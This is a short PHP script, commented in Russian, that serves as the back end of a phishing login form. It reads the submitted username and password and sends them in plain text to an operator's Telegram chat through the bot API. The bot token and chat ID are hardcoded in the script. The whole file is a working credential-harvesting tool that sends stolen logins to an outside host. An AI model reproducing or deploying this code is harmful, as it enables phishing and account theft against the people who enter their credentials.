<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Токен вашего бота
    $botToken = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
    // Ваш чат ID
    $chatId = "-4276589204";
    
    $message = "Username: " . $username . "\nPassword: " . $password;
    
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );
    
    $options = array(
        'http' => array(
            'method'  => 'POST',
            'header'  => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ),
    );
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === FALSE) {
        die('Error sending message');
    }

    echo "Message sent successfully";
}
?>